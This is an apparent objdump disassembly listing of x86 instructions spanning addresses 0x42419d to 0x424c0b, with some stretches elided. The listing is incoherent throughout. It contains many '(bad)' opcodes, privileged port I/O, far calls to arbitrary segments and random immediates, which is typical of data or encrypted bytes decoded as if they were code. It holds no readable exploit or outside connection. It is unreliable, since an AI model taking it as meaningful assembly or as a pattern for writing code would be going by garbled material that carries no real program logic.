  42419d:	add    al,0xc1
  42419f:	cli    
  4241a0:	ficomp WORD PTR [esi-0x21]
  4241a3:	cs pusha 
  4241a5:	enter  0x7cdb,0x83
  4241a9:	ss and al,0x5b
  4241ac:	ins    DWORD PTR es:[edi],dx
  4241ad:	jmp    0x9ecc:0x5c619790
  4241b4:	sbb    al,0x1c
  4241b6:	xchg   ebx,eax
  4241b7:	mov    ds:0xbefeeb6e,al
  4241bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241bd:	popa   
  4241be:	sar    BYTE PTR [ecx],1
  4241c0:	sahf   
  4241c1:	sub    DWORD PTR [edx-0x4bc6872f],esi
  4241c7:	popa   
  4241c8:	xor    DWORD PTR [ebx],0xe95b249a
  4241ce:	pop    esp
  4241cf:	test   ch,cl
  4241d1:	lds    ebx,FWORD PTR [eax]
  4241d3:	or     bh,BYTE PTR [esi-0xac4b9a2]
  4241d9:	addr16 jnp 0x42423e
  4241dc:	lock cs ds pop esi
  4241e0:	adc    al,0xd1
  4241e2:	test   DWORD PTR [esi],ebp
  4241e4:	sbb    al,0x82
  4241e6:	inc    ebp
  4241e7:	in     eax,0x4b
  4241e9:	cmp    eax,0x85a4059c
  4241ee:	add    esi,DWORD PTR [ecx-0x5af82e99]
  4241f4:	fstp   DWORD PTR [edi+0x17]
  4241f7:	out    0xe3,al
  4241f9:	jne    0x42426d
  4241fb:	dec    edi
  4241fc:	(bad)  
  4241fd:	fmul   DWORD PTR [ecx+0x7a25afa7]
  424203:	inc    ecx
  424204:	stc    
  424205:	std    
  424206:	inc    ecx
  424207:	jecxz  0x424195
  424209:	in     eax,0xe4
  42420b:	sbb    DWORD PTR [eax+eax*4],ecx
  42420e:	jno    0x424190
  424210:	and    ch,al
  424212:	pusha  
  424213:	pop    ebp
  424214:	mov    ebx,0x88d33cfe
  424219:	in     eax,0x1d
  42421b:	rcl    DWORD PTR [eax+0x1c],0xb4
  42421f:	in     eax,dx
  424220:	pop    ecx
  424221:	sub    DWORD PTR [esi-0x48],esp
  424224:	xor    BYTE PTR [edi],bh
  424226:	push   esp
  424227:	jg     0x424279
  424229:	cdq    
  42422a:	adc    BYTE PTR [esi-0xe],bl
  42422d:	xchg   DWORD PTR [ebx],edi
  42422f:	pusha  
  424230:	mov    WORD PTR [ebx+0x12],?
  424233:	mov    ds:0xbb17f806,eax
  424238:	dec    esi
  424239:	add    al,0xde
  42423b:	or     eax,0x76e0a267
  424240:	stos   DWORD PTR es:[edi],eax
  424241:	loop   0x4242ab
  424243:	mov    BYTE PTR ds:[ecx-0x7f],dh
  424247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424248:	rcl    ah,cl
  42424a:	sub    dl,bl
  42424c:	push   ecx
  42424d:	bound  ebp,QWORD PTR [esp+ebp*1]
  424250:	inc    esp
  424251:	jle    0x4241fc
  424253:	(bad)  
  424254:	cmp    eax,0x615afd48
  424259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42425a:	cmp    ecx,DWORD PTR [ecx]
  42425c:	push   edi
  42425d:	sbb    DWORD PTR [ebp-0x6855b59a],ebx
  424263:	int    0x3
  424265:	stos   BYTE PTR es:[edi],al
  424266:	pop    edx
  424267:	xchg   ecx,eax
  424268:	xchg   BYTE PTR [ebp-0x39dcdd1],bl
	...
  4242d6:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	iret   
  4242e3:	add    dh,BYTE PTR [edi+0x18467e0]
  4242e9:	add    BYTE PTR [eax],al
  4242eb:	add    DWORD PTR [eax],eax
  4242ed:	add    al,bh
  4242ef:	test   BYTE PTR [ebx-0x17aea90c],cl
  4242f5:	or     DWORD PTR [edi+eiz*4+0x7c],ecx
  4242f9:	pop    ebp
  4242fa:	pop    edi
  4242fb:	lods   al,BYTE PTR ds:[esi]
  4242fc:	sbb    al,0x17
  4242fe:	cmp    ecx,eax
  424300:	out    0x34,al
  424302:	rcl    cl,cl
  424304:	lods   eax,DWORD PTR ds:[esi]
  424305:	lods   al,BYTE PTR ds:[esi]
  424306:	fcmovbe st,st(0)
  424308:	nop
  424309:	(bad)  
  42430a:	aaa    
  42430b:	(bad)  
  42430d:	fist   WORD PTR [edi+0xf096907]
  424313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424314:	jge    0x424381
  424316:	xchg   DWORD PTR [eax+ecx*4],edx
  424319:	pop    esp
  42431a:	stc    
  42431b:	(bad)  
  42431c:	cdq    
  42431d:	mov    eax,ds:0xa71b0aef
  424322:	push   edx
  424323:	xor    al,0x33
  424325:	jo     0x424309
  424327:	push   es
  424328:	sbb    DWORD PTR [edx],edx
  42432a:	sbb    DWORD PTR [ecx],ebp
  42432c:	and    al,0x10
  42432e:	xchg   bh,ch
  424330:	data16 jbe 0x42437b
  424333:	sbb    edi,DWORD PTR [edx]
  424335:	sysret 
  424337:	xchg   ecx,eax
  424338:	retf   0xeef6
  42433b:	xor    DWORD PTR [esi-0x6628a949],0x22
  424342:	(bad)
  424345:	retf   0xbd27
  424348:	push   cs
  424349:	pop    ds
  42434a:	fwait
  42434b:	aas    
  42434c:	pop    ebp
  42434d:	hlt    
  42434e:	sbb    eax,0x266aa4ed
  424353:	mov    edi,0xecaf4a51
  424358:	test   eax,0xc3b13da8
  42435d:	jne    0x424313
  42435f:	aad    0xec
  424361:	ds leave 
  424363:	setp   ah
  424366:	ins    BYTE PTR es:[edi],dx
  424367:	dec    ebp
  424368:	fst    st(5)
  42436a:	das    
  42436b:	add    BYTE PTR [esp+eiz*2+0x72b0ec38],dl
  424372:	push   edx
  424373:	mov    BYTE PTR [esi+0x63268cae],dl
  424379:	daa    
  42437a:	lds    ecx,FWORD PTR [edi]
  42437c:	outs   dx,BYTE PTR ds:[esi]
  42437d:	xchg   edi,eax
  42437e:	in     al,0xa8
  424380:	sbb    al,0x4c
  424383:	push   0xffffffdf
  424385:	inc    ebp
  424386:	fucomip st,st(2)
  424388:	xchg   esp,eax
  424389:	int    0x7
  42438b:	std    
  42438c:	sub    BYTE PTR [edx],dh
  42438e:	mov    fs,edx
  424390:	inc    eax
  424391:	jo     0x4243f4
  424393:	jp     0x4243f4
  424395:	in     al,0x8c
  424397:	mov    ecx,0x5ec2654a
  42439c:	add    ch,BYTE PTR [eax+0x54]
  42439f:	and    BYTE PTR [eax-0x28],dh
  4243a2:	mov    ds:0x363421a8,al
  4243a7:	mov    WORD PTR [ebx-0x12],?
  4243aa:	shr    BYTE PTR [eax],0x10
  4243ad:	das    
  4243ae:	push   0xfffffffc
  4243b0:	push   ebx
  4243b1:	mov    ebp,DWORD PTR [esi-0x7a56cbd2]
  4243b7:	xchg   ecx,eax
  4243b8:	add    ax,0xd55d
  4243bc:	mov    BYTE PTR [edi],bh
  4243be:	jbe    0x424410
  4243c0:	xor    al,0xaa
  4243c2:	add    DWORD PTR ss:[eax+0x40],eax
  4243c6:	push   edx
  4243c7:	ja     0x424389
  4243c9:	aad    0xdf
  4243cb:	push   ds
  4243cc:	xor    al,0x3e
  4243ce:	pop    es
  4243cf:	shl    BYTE PTR [ebx],cl
  4243d1:	jnp    0x42435f
  4243d3:	and    BYTE PTR [ecx-0x45e73331],al
  4243d9:	add    cl,BYTE PTR [ebp-0x71]
  4243dc:	retf   
  4243dd:	call   0x10a00b0b
  4243e2:	lahf   
  4243e3:	call   0x91914ae2
  4243e8:	retf   
  4243e9:	out    dx,eax
  4243ea:	(bad)  
  4243eb:	shr    DWORD PTR [ecx-0x5d],cl
	...
  424456:	mov    ah,BYTE PTR [esi]
  424458:	jge    0x424414
  42445a:	std    
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x424453
  424463:	test   BYTE PTR [edi-0x4],dh
  424466:	test   DWORD PTR [bx+di],eax
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    BYTE PTR [edx-0x5],ah
  424470:	xrelease mov BYTE PTR [eax-0xb83a768],al
  424477:	gs mov ch,0xa5
  42447a:	icebp  
  42447b:	lds    edi,FWORD PTR [edi-0x701ceff8]
  424481:	sbb    dl,BYTE PTR ds:0x2691b9f4
  424487:	or     al,0x4c
  424489:	adc    DWORD PTR [ebx-0x80],0xa9775cc
  424490:	push   0xeea58319
  424495:	call   0x422f7fe3
  42449a:	xor    ah,dh
  42449c:	repnz xor cl,dh
  42449f:	dec    ebp
  4244a0:	inc    eax
  4244a1:	(bad)  
  4244a2:	push   edi
  4244a3:	std    
  4244a4:	or     al,0xdc
  4244a6:	fild   DWORD PTR [edx+0x169e6fad]
  4244ac:	lock xchg BYTE PTR ds:0x963af81a,ah
  4244b3:	and    bl,BYTE PTR [esi-0x54abb1b1]
  4244b9:	je     0x42452f
  4244bb:	push   cs
  4244bc:	ror    bh,cl
  4244be:	sub    dl,BYTE PTR [edi+0x2ba114c3]
  4244c4:	pop    DWORD PTR [edi-0x4e99836f]
  4244ca:	jmp    FWORD PTR [edi]
  4244cc:	fstp   DWORD PTR [eax-0x27]
  4244cf:	and    DWORD PTR [edi+0x18],0x1c
  4244d3:	(bad)  
  4244d4:	adc    ah,ch
  4244d6:	fild   QWORD PTR [ecx-0x150b2f56]
  4244dc:	mov    ds:0xb2e45b81,al
  4244e1:	jo     0x4244a5
  4244e3:	push   edx
  4244e4:	dec    esi
  4244e5:	into   
  4244e6:	inc    eax
  4244e7:	mov    esp,0x15a87c89
  4244ec:	dec    ebx
  4244ed:	int    0x91
  4244ef:	cld    
  4244f0:	imul   esp,DWORD PTR [ecx+eax*8],0x76
  4244f4:	test   al,0x80
  4244f6:	ja     0x42455a
  4244f8:	and    al,0xc6
  4244fa:	sub    BYTE PTR [ebx],cl
  4244fc:	retf   
  4244fd:	rol    BYTE PTR [ebx+0x66],0x83
  424501:	pop    ss
  424502:	aam    0x39
  424504:	fnstcw WORD PTR [edx-0x253a052]
  42450a:	fidivr WORD PTR fs:[eax-0x3c]
  42450e:	xor    ebp,DWORD PTR [ecx+0x79]
  424511:	aaa    
  424512:	test   al,0xe3
  424514:	pop    esi
  424515:	push   edi
  424516:	sbb    BYTE PTR [ebp+0x3dedca79],bl
  42451c:	ficomp DWORD PTR [edx]
  42451e:	add    esi,esp
  424520:	sub    cl,ch
  424522:	push   eax
  424523:	xor    al,0x36
  424525:	jnp    0x424561
  424527:	pusha  
  424528:	aaa    
  424529:	mov    ebp,0xadee5b89
  42452e:	push   ebx
  42452f:	popa   
  424530:	pop    es
  424531:	mov    ecx,0xfe02ed20
  424536:	adc    eax,0xd1183a5b
  42453b:	and    ebp,esi
  42453d:	jg     0x424574
  42453f:	xchg   dh,dh
  424541:	pop    ss
  424542:	imul   ecx,ecx,0x34945a8e
  424548:	addr16 mov cl,0xcc
  42454b:	mov    ds:0xc6c1a11e,al
  424550:	adc    BYTE PTR [ecx-0xc],0xcd
  424554:	(bad)  
  424555:	in     eax,0xcc
  424557:	sbb    eax,0xa780dc37
  42455c:	and    ecx,0xffffff8c
  42455f:	sub    DWORD PTR [edi],ecx
  424561:	add    BYTE PTR [edx],dh
  424563:	cmp    DWORD PTR [edi+0x1e],0x73
  424567:	cmc    
  424568:	dec    esi
  424569:	fcomp  DWORD PTR [ebp+0x6d]
  42456c:	stos   BYTE PTR es:[edi],al
  42456d:	pop    DWORD PTR [eax]
	...
  4245d3:	add    BYTE PTR [eax],al
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x30],1
  4245e3:	fcmovbe st,st(0)
  4245e5:	arpl   WORD PTR [edi-0x7a],sp
  4245e8:	add    DWORD PTR [eax],eax
  4245ea:	add    BYTE PTR [ecx],al
  4245ec:	add    BYTE PTR [eax],al
  4245ee:	and    DWORD PTR [ebx],ebp
  4245f0:	xor    dl,BYTE PTR [edi-0xd38379]
  4245f6:	or     dh,BYTE PTR [esi+eiz*2-0x40]
  4245fa:	test   BYTE PTR [ecx],0xbe
  4245fd:	sub    DWORD PTR [edi],ebx
  4245ff:	into   
  424600:	xchg   ecx,eax
  424601:	aad    0x5b
  424603:	mov    bl,0x22
  424605:	xchg   esp,eax
  424606:	and    esp,DWORD PTR [ebp+0xa]
  424609:	xor    edx,DWORD PTR [eax]
  42460b:	fild   WORD PTR ds:0xe9678262
  424611:	dec    ebx
  424612:	repnz cld 
  424614:	mov    ebp,DWORD PTR [esi-0x3a]
  424617:	adc    al,0x37
  424619:	add    al,BYTE PTR [eax]
  42461b:	daa    
  42461c:	fidiv  WORD PTR [esi-0x52a65a83]
  424622:	jno    0x4245fa
  424624:	inc    esp
  424625:	and    DWORD PTR [esi-0x4e],edx
  424628:	push   ebp
  424629:	test   DWORD PTR [esi-0x7],esi
  42462c:	push   ds
  42462d:	jns    0x4245b1
  42462f:	add    eax,0xc19af688
  424634:	inc    eax
  424635:	push   0xffffffa2
  424637:	push   ss
  424638:	mov    ebp,0x70e12d76
  42463d:	cmp    edi,DWORD PTR [esi+eiz*1+0x656c2c37]
  424644:	(bad)  
  424645:	(bad)  
  424647:	xchg   edi,eax
  424648:	ror    BYTE PTR [edi+esi*8-0x397bf59d],0x81
  424650:	ret    0x5dbf
  424653:	mov    ecx,0xeadcd4cd
  424658:	inc    edi
  424659:	push   esi
  42465a:	mov    eax,0xaf49b847
  42465f:	int3   
  424660:	sub    ah,bh
  424662:	test   BYTE PTR [esi+0x6c],dh
  424665:	or     al,0x90
  424667:	sti    
  424668:	loopne 0x424646
  42466a:	in     al,dx
  42466b:	mov    al,0xf5
  42466d:	(bad)  
  42466e:	(bad)  
  42466f:	scas   eax,DWORD PTR es:[edi]
  424670:	rol    cl,1
  424672:	fadd   st,st(6)
  424674:	stc    
  424675:	jmp    0x70dd8a08
  42467a:	add    BYTE PTR [ebx+edx*2-0xf],bl
  42467e:	inc    edi
  42467f:	xor    eax,edx
  424681:	add    DWORD PTR [esi-0x22883903],ecx
  424687:	shl    DWORD PTR [edx],0xd9
  42468a:	mov    eax,ds:0xeb69c0cb
  42468f:	mov    esi,0xa4a3b534
  424694:	sbb    ecx,DWORD PTR [edx+0x5c]
  424697:	cmc    
  424698:	fdivp  st(1),st
  42469a:	xchg   ecx,eax
  42469b:	cmp    BYTE PTR [edx-0x43206077],ch
  4246a1:	rcl    DWORD PTR [edi],cl
  4246a3:	aam    0x6b
  4246a5:	cs mov esi,0xe7c279a1
  4246ab:	inc    edx
  4246ac:	push   ebp
  4246ad:	dec    esi
  4246ae:	sahf   
  4246af:	inc    esi
  4246b0:	sbb    BYTE PTR fs:[ecx-0x7c],ah
  4246b4:	or     DWORD PTR [edx+0x57],edi
  4246b7:	jmp    0xdbfa49f8
  4246bc:	cmp    edi,esp
  4246be:	lahf   
  4246bf:	shl    BYTE PTR [ebx-0x42bd24f7],cl
  4246c5:	or     BYTE PTR [ebp+0x3a3ebdd2],dh
  4246cb:	ret    0x2477
  4246ce:	dec    edx
  4246cf:	jl     0x424657
  4246d1:	or     ebx,esi
  4246d3:	cmc    
  4246d4:	sub    ebp,DWORD PTR [edi]
  4246d6:	pop    esi
  4246d7:	iret   
  4246d8:	inc    ecx
  4246d9:	add    edx,esi
  4246db:	mov    dh,0xda
  4246dd:	inc    eax
  4246de:	sub    al,0x52
  4246e0:	or     ebx,eax
  4246e2:	(bad)
  4246e5:	loop   0x4246e0
  4246e7:	lods   al,BYTE PTR ds:[esi]
  4246e8:	mov    ebx,0xe139a769
  4246ed:	add    BYTE PTR [bx+si],al
	...
  424754:	add    BYTE PTR [eax],al
  424756:	mov    esp,0xfefffc92
  42475b:	(bad)  
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [esi],bh
  424763:	pop    es
  424764:	lods   eax,DWORD PTR ds:[esi]
  424765:	stos   DWORD PTR es:[edi],eax
  424766:	xchg   DWORD PTR [bx+di],eax
  424769:	add    BYTE PTR [eax],al
  42476b:	add    DWORD PTR [eax],eax
  42476d:	add    ah,ah
  42476f:	rcr    esp,cl
  424771:	push   ecx
  424772:	pcmpeqd mm5,QWORD PTR [esi+eax*2+0x2d]
  424777:	jge    0x4247c1
  424779:	mov    ds,WORD PTR [ebx+ebx*2-0x50]
  42477d:	aaa    
  42477e:	push   eax
  42477f:	xchg   esp,esi
  424781:	rol    DWORD PTR [si],1
  424784:	(bad)  
  424786:	add    eax,0xeddb9f24
  42478c:	lods   al,BYTE PTR ds:[esi]
  42478d:	lock dec edx
  42478f:	sub    BYTE PTR [ebp-0x61],bh
  424792:	mov    eax,0x5103adc4
  424797:	out    0x4f,al
  424799:	cmp    eax,0xd3590dc8
  42479e:	pop    esp
  42479f:	aam    0xca
  4247a1:	inc    eax
  4247a2:	ins    DWORD PTR es:[edi],dx
  4247a3:	or     BYTE PTR [ebx],dl
  4247a5:	or     DWORD PTR [edx-0x15],ecx
  4247a8:	add    BYTE PTR [ebx],ch
  4247aa:	rcr    BYTE PTR [edx-0x41],cl
  4247ad:	and    BYTE PTR [esi],bl
  4247af:	arpl   WORD PTR [edx+0x30],cx
  4247b2:	xchg   ebx,eax
  4247b3:	or     ebx,esp
  4247b5:	jnp    0x424757
  4247b7:	out    0xde,al
  4247b9:	jnp    0x42480c
  4247bb:	inc    edx
  4247bc:	push   0xb7368c42
  4247c1:	fadd   QWORD PTR [esi+ebp*8+0x4d]
  4247c5:	imul   ebp,DWORD PTR [ebp+0x2f0fb95d],0x1f
  4247cc:	xchg   edi,eax
  4247cd:	sbb    al,0x37
  4247cf:	push   esi
  4247d0:	out    dx,al
  4247d1:	jnp    0x4247b5
  4247d3:	jecxz  0x424814
  4247d5:	rcl    BYTE PTR [esi],0xd
  4247d8:	mov    ch,0x85
  4247da:	retf   0xa513
  4247dd:	mov    dl,0xe9
  4247df:	push   esi
  4247e0:	lods   eax,DWORD PTR ds:[esi]
  4247e1:	(bad)
  4247e4:	inc    ecx
  4247e5:	cld    
  4247e6:	ins    BYTE PTR es:[edi],dx
  4247e7:	stos   DWORD PTR es:[edi],eax
  4247e8:	mov    esp,0x5ce73c5f
  4247ed:	jge    0x424792
  4247ef:	inc    ebx
  4247f0:	imul   ebx,DWORD PTR [edi],0x3
  4247f3:	in     eax,0xc3
  4247f5:	in     eax,dx
  4247f6:	scas   eax,DWORD PTR es:[edi]
  4247f7:	sbb    cl,BYTE PTR [eax]
  4247f9:	xchg   edi,eax
  4247fa:	cmp    BYTE PTR [edx+0x4a],bl
  4247fd:	mov    edi,0xdc65bd1b
  424802:	cmp    BYTE PTR [eax-0x455f381],ah
  424808:	dec    ecx
  424809:	lock jb 0x424840
  42480c:	adc    ecx,eax
  42480e:	shl    BYTE PTR [esi+edx*1+0x2e09908b],1
  424815:	sub    al,0x1b
  424817:	mov    ecx,0xc7d2c490
  42481c:	dec    ebx
  42481d:	inc    esp
  42481e:	cmp    eax,DWORD PTR [ecx]
  424820:	dec    edi
  424821:	and    edx,DWORD PTR [ebx-0x4f12cafd]
  424827:	imul   edx,DWORD PTR [ebx+esi*8-0x110ac2f3],0xf4f95ddb
  424832:	adc    ebx,DWORD PTR [ebx]
  424834:	(bad)
  424837:	adc    DWORD PTR [eax+0x6ee1afa5],eax
  42483d:	cmp    esp,0x12
  424840:	ins    BYTE PTR es:[edi],dx
  424841:	xor    eax,0xde33485c
  424846:	call   0xf9e2480f
  42484b:	pushf  
  42484c:	dec    edx
  42484d:	cli    
  42484e:	pop    edi
  42484f:	ja     0x424845
  424851:	jo     0x4248c2
  424853:	inc    ebx
  424854:	int    0xfa
  424856:	pop    ss
  424857:	call   0xd0a8a97c
  42485c:	imul   ebx,DWORD PTR [edi],0x2a
  42485f:	mov    cl,0x1c
  424861:	jns    0x42487a
  424863:	fisttp WORD PTR [esi-0x2bc6a6b2]
  424869:	jl     0x42485b
  42486b:	pop    ebp
  42486c:	mov    bl,0xeb
	...
  4248d6:	and    bl,BYTE PTR [eax-0x7c]
  4248d9:	out    dx,eax
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	jnp    0x424900
  4248e4:	push   ecx
  4248e5:	mov    al,ds:0x18867
  4248ea:	add    BYTE PTR [ecx],al
  4248ec:	add    BYTE PTR [eax],al
  4248ee:	cmp    edi,esp
  4248f0:	xor    dl,BYTE PTR ds:0x251a517
  4248f6:	sub    DWORD PTR [edx+0x4082c193],0x7b4d2f72
  424900:	xchg   ebx,eax
  424901:	add    eax,0xbc8a2f25
  424906:	pop    esp
  424907:	jno    0x424906
  424909:	xchg   DWORD PTR [edx+0x46],edi
  42490c:	test   BYTE PTR [edx+0x38],ch
  42490f:	dec    ebp
  424910:	pop    ebp
  424911:	inc    ebx
  424912:	daa    
  424913:	call   0x6f0e:0x6a9d89c6
  42491a:	jge    0x424998
  42491c:	into   
  42491d:	push   ebp
  42491e:	mov    edi,0x4edd1c0f
  424923:	jae    0x424981
  424925:	dec    edi
  424926:	mov    al,0x94
  424928:	mov    ds:0x23d01f0b,al
  42492d:	or     ebp,DWORD PTR [edx]
  42492f:	add    al,0xb8
  424931:	out    dx,eax
  424932:	push   eax
  424933:	pop    edi
  424934:	inc    esp
  424935:	aaa    
  424936:	sti    
  424937:	mov    esp,0xe7d5c8bd
  42493c:	add    dl,BYTE PTR [esi]
  42493e:	dec    esp
  42493f:	push   cs
  424940:	out    dx,eax
  424941:	dec    eax
  424942:	das    
  424943:	sbb    ah,BYTE PTR [edx]
  424945:	adc    DWORD PTR [esi],edi
  424947:	push   0xfb03ad78
  42494c:	bound  edx,QWORD PTR [eax]
  42494e:	sub    BYTE PTR [edx],dl
  424950:	fwait
  424951:	dec    eax
  424952:	mov    eax,0x182fd86b
  424957:	unpckhps xmm7,xmm0
  42495a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42495b:	das    
  42495c:	dec    ecx
  42495d:	jnp    0x4248e4
  42495f:	sbb    ch,ch
  424961:	js     0x4248e4
  424963:	mov    al,ds:0x815001d9
  424968:	and    bh,BYTE PTR [ebp+0x34]
  42496b:	sbb    al,0x15
  42496d:	push   eax
  42496e:	pop    eax
  42496f:	mov    ds:0xfed7c0b6,al
  424974:	pushf  
  424975:	aad    0x3a
  424977:	dec    eax
  424978:	mov    ds:0x18c999f6,eax
  42497d:	mov    ecx,0x96e94009
  424982:	sbb    al,0x23
  424984:	cmp    eax,0x43b0c121
  424989:	inc    ecx
  42498a:	sbb    eax,ecx
  42498c:	jge    0x424934
  42498e:	mov    al,ds:0x6ee9ecf8
  424993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424994:	cmp    edi,DWORD PTR [ebx+0x4e]
  424997:	jno    0x42498b
  424999:	adc    BYTE PTR [esp+ebp*1+0x2408632],ch
  4249a0:	imul   ebp,DWORD PTR [edx+0x3d2b8873],0xffffffdb
  4249a7:	aaa    
  4249a8:	call   0xadab:0x2971d11d
  4249af:	inc    ebx
  4249b0:	subps  xmm2,xmm5
  4249b3:	sbb    eax,0xce3470ae
  4249b8:	jp     0x4249e5
  4249ba:	int    0x48
  4249bc:	int3   
  4249bd:	xchg   edi,eax
  4249be:	out    0x6a,al
  4249c0:	mov    BYTE PTR gs:[edx-0xa],0xe9
  4249c5:	push   edx
  4249c6:	sbb    eax,0x622b93f0
  4249cb:	jg     0x424970
  4249cd:	ds sbb ax,0x8f5c
  4249d2:	ds mov cl,0x39
  4249d5:	aad    0x5e
  4249d7:	xchg   ebx,eax
  4249d8:	leave  
  4249d9:	xlat   BYTE PTR ds:[ebx]
  4249da:	xor    esi,edi
  4249dc:	and    bl,bl
  4249de:	lods   al,BYTE PTR ds:[esi]
  4249df:	mov    eax,DWORD PTR [ebx+0x49]
  4249e2:	inc    esp
  4249e3:	or     DWORD PTR [edi+0x37],esi
  4249e6:	and    eax,0xd63302a0
  4249eb:	xchg   DWORD PTR [edx-0x5a],edi
	...
  424a56:	imul   ebx,DWORD PTR [eax],0x63
  424a59:	push   0x73
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    ch,BYTE PTR [esp+eiz*8-0x7698e150]
  424a68:	add    DWORD PTR [eax],eax
  424a6a:	add    BYTE PTR [ecx],al
  424a6c:	add    BYTE PTR [eax],al
  424a6e:	cmc    
  424a6f:	ja     0x424a22
  424a71:	or     ecx,esp
  424a73:	ins    BYTE PTR es:[edi],dx
  424a74:	pusha  
  424a75:	or     al,BYTE PTR [esi+0x4a]
  424a78:	jo     0x424aeb
  424a7a:	(bad)  
  424a7b:	das    
  424a7c:	sub    DWORD PTR gs:[ebx*2-0x5997f73e],ebp
  424a84:	mov    dl,0xad
  424a86:	(bad)  
  424a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a88:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  424a8a:	les    ecx,FWORD PTR [bx]
  424a8d:	aad    0xa4
  424a8f:	sub    DWORD PTR [ecx-0x48],ecx
  424a92:	leave  
  424a93:	xrelease mov BYTE PTR [esi],dl
  424a96:	inc    esi
  424a97:	ins    BYTE PTR es:[edi],dx
  424a98:	es adc esp,ebp
  424a9b:	mov    eax,0x72b9e099
  424aa0:	mov    WORD PTR [edx],fs
  424aa2:	in     eax,0x5f
  424aa4:	hlt    
  424aa5:	xor    eax,0x2c6fc0c3
  424aaa:	lds    eax,FWORD PTR [ecx]
  424aac:	loop   0x424ab8
  424aae:	les    eax,FWORD PTR [edx]
  424ab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ab1:	js     0x424a64
  424ab3:	aaa    
  424ab4:	cmp    esp,DWORD PTR [edx+0x76f64638]
  424aba:	dec    ebp
  424abb:	arpl   WORD PTR [ebp+eiz*2+0x2c1ac253],bx
  424ac2:	push   0x38
  424ac4:	mov    ecx,0x31851359
  424ac9:	mov    al,0x87
  424acb:	xor    al,0x3e
  424acd:	dec    ebp
  424ace:	call   0x3653:0xe15cff79
  424ad5:	pop    ecx
  424ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ad7:	repnz inc ecx
  424ad9:	xchg   edx,eax
  424ada:	mov    bl,0x20
  424adc:	xchg   edx,eax
  424add:	xchg   ecx,eax
  424ade:	ja     0x424aff
  424ae0:	out    dx,eax
  424ae1:	mov    es,WORD PTR [ebx-0x2]
  424ae4:	and    bl,BYTE PTR [esi-0x7cec003c]
  424aea:	not    DWORD PTR [edi+eax*4+0x8]
  424aee:	jnp    0x424a8d
  424af0:	ss inc edi
  424af2:	mov    esp,0x37a994a3
  424af7:	(bad)  
  424af8:	mov    eax,0x45f38faa
  424afd:	pop    ebx
  424afe:	sub    BYTE PTR [ecx+eax*1],0x8b
  424b02:	loop   0x424af1
  424b04:	jecxz  0x424b07
  424b06:	mov    dl,0x47
  424b08:	dec    esp
  424b09:	xor    edx,DWORD PTR [ebp-0x230296cf]
  424b0f:	(bad)  
  424b10:	xor    ah,dl
  424b12:	pop    es
  424b13:	or     al,0xc3
  424b15:	push   es
  424b16:	loope  0x424b51
  424b18:	in     eax,0x25
  424b1a:	dec    ebp
  424b1b:	mov    esp,0xdcf64ccd
  424b20:	rcr    DWORD PTR [eax],1
  424b22:	jo     0x424b9b
  424b24:	pop    ebx
  424b25:	xchg   ebx,eax
  424b26:	mov    al,ds:0x7f2d70c7
  424b2b:	mov    ebx,0x396bebb0
  424b30:	fwait
  424b31:	arpl   WORD PTR [eax-0x14],dx
  424b34:	fidiv  WORD PTR [edi]
  424b36:	mov    BYTE PTR ss:[esp+ebx*2-0x2],al
  424b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b3c:	sub    eax,0x2af09881
  424b41:	xchg   ebx,eax
  424b42:	dec    edx
  424b43:	pop    ss
  424b44:	sub    BYTE PTR [eax+0x6a88a57b],cl
  424b4a:	lods   al,BYTE PTR ds:[esi]
  424b4b:	cmc    
  424b4c:	dec    esp
  424b4d:	jne    0x424bb6
  424b4f:	push   eax
  424b50:	ins    DWORD PTR es:[edi],dx
  424b51:	mov    cl,0x71
  424b53:	mov    bl,0xf2
  424b55:	loope  0x424af0
  424b57:	ins    BYTE PTR es:[edi],dx
  424b58:	xchg   edi,eax
  424b59:	(bad)  
  424b5a:	aas    
  424b5b:	(bad)  
  424b5c:	repnz push ds
  424b5e:	sub    eax,0xaea6902
  424b63:	cmp    al,BYTE PTR [edi-0x405e8578]
  424b69:	mov    ah,0xb1
  424b6b:	loope  0x424b85
  424b6d:	mov    bh,0x0
	...
  424bd3:	add    BYTE PTR [eax],al
  424bd5:	add    BYTE PTR [esi],al
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	shr    BYTE PTR [esi-0x7598df00],cl
  424be8:	add    DWORD PTR [eax],eax
  424bea:	add    BYTE PTR [ecx],al
  424bec:	add    BYTE PTR [eax],al
  424bee:	test   al,0x29
  424bf0:	clc    
  424bf1:	jno    0x424bd1
  424bf3:	js     0x424c0e
  424bf5:	pop    ebp
  424bf6:	jae    0x424c66
  424bf8:	rcr    BYTE PTR [ecx+0x200514e2],cl
  424bfe:	add    eax,0x110e422a
  424c03:	nop
  424c04:	jae    0x424c0c
  424c06:	jmp    0x424b98
  424c08:	dec    edx
  424c09:	aad    0x2f
  424c0b:	xchg   esi,eax
